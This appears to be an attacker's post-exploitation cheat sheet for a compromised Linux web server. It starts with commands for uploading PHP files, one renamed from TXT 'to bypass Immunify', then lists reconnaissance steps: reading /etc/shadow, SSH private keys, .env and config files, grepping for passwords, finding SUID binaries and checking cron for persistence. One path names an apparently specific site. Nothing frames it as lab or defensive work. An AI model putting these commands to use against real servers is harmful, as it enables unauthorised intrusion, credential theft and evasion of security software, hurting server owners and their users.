# === Uploading TXT / PHP ===
upload_txt filename.txt /var/www/html/file.txt	# Make sure its on the working same dir
upload_php filename.php /var/www/html/file.php	# Command to upload PHP file
upload_txt filename.txt /var/www/html/file.php	# Command to upload Txt file and rename into PHP file to bypass Immunify

# === WEBSITE & WEB ROOT INFORMATION ===
pwd                                    # Current working directory
ls -la                                 # List files in current directory
cat /etc/hostname                      # Server hostname
hostname                               # Get hostname

# === WEB ROOT & CONFIGURATION ===
find / -name "index.php" 2>/dev/null   # Find web root locations
grep -r "DocumentRoot" /etc/apache2/ 2>/dev/null   # Apache web root
grep -r "root" /etc/nginx/sites-enabled/ 2>/dev/null  # Nginx web root
cat /etc/apache2/sites-enabled/*.conf 2>/dev/null     # Apache config
cat /etc/nginx/sites-enabled/default 2>/dev/null      # Nginx config

# === USER & PERMISSIONS ===
whoami                                 # Current user
id                                     # User ID and groups
sudo -l                                # Sudo privileges (might ask password)
groups                                 # User groups
cat /etc/passwd                        # All users on system
cat /etc/shadow                        # Password hashes (if readable)

# === SYSTEM INFORMATION ===
uname -a                               # System info (kernel, OS)
cat /etc/os-release                    # OS details
lsb_release -a                         # Linux version
df -h                                  # Disk usage
free -h                                # Memory usage
ps aux                                 # Running processes
netstat -tulpn 2>/dev/null             # Open ports and connections
ss -tulpn 2>/dev/null                  # Socket statistics

# === NETWORK INFORMATION ===
ifconfig                               # Network interfaces
ip addr                                # IP addresses
cat /etc/resolv.conf                   # DNS servers
route -n                               # Routing table

# === FILE & DIRECTORY EXPLORATION ===
ls -la /home/                          # Home directories
ls -la /var/www/                       # Web directories
ls -la /opt/                           # Optional software
find / -type f -name "*.php" 2>/dev/null | head -20  # Find PHP files
find / -type f -name "*.conf" 2>/dev/null | head -20  # Find config files
find / -type f -name "*.sql" 2>/dev/null | head -20   # Find SQL files

# === DATABASE INFORMATION ===
cat /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null  # MySQL config
cat /home/*/.*rc* | grep -i password 2>/dev/null     # Password in configs
env                                    # Environment variables

# === SOURCE CODE & SENSITIVE DATA ===
cat /home/*/public_html/config.php 2>/dev/null       # Config files
cat /home/*/invoices.my.id/.env 2>/dev/null          # .env files
find / -name ".env" 2>/dev/null                      # Environment files
find / -name "config.php" 2>/dev/null                # Config files

# === WEB SERVER PROCESSES ===
ps aux | grep -E "apache|nginx|php|node"             # Web processes
systemctl status apache2 2>/dev/null                 # Apache status
systemctl status nginx 2>/dev/null                   # Nginx status

# === INSTALLED SOFTWARE ===
apt list --installed 2>/dev/null | grep -E "php|mysql|apache|nginx"
dpkg -l | grep -E "php|mysql|apache|nginx"           # Installed packages
which php                              # PHP location
php -v                                 # PHP version

# === CRON JOBS (Persistence) ===
crontab -l                             # Current user cron jobs
cat /etc/crontab                       # System cron jobs
ls -la /etc/cron.d/                    # Cron directory

# === SSH & AUTHENTICATION ===
cat ~/.ssh/id_rsa 2>/dev/null          # SSH private key
cat ~/.ssh/authorized_keys 2>/dev/null # Authorized SSH keys
cat /etc/ssh/sshd_config                # SSH configuration

# === PRIVILEGE ESCALATION CHECKS ===
find / -perm -u+s -type f 2>/dev/null  # SUID binaries
find / -perm -g+s -type f 2>/dev/null  # SGID binaries
cat /etc/sudoers 2>/dev/null           # Sudoers file